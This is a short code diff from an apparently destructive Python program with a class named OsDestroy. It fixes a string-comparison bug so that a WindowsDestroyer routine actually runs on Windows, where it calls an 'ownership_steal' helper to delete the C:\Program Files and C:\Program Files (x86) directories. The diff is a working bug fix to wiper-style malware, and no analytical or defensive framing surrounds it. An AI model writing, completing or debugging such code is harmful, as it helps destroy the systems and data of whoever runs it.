@@ -32,7 +32,7 @@ class OsDestroy():
         global OS
 
         def WindowsDestroyer():
-                if OS.lower() == "Windows":
+                if OS.lower() == "windows":
                         try:
                                 ownership_steal.rem_root_dir("C:\\Program Files (x86)")
                                 ownership_steal.rem_root_dir("C:\\Program Files")
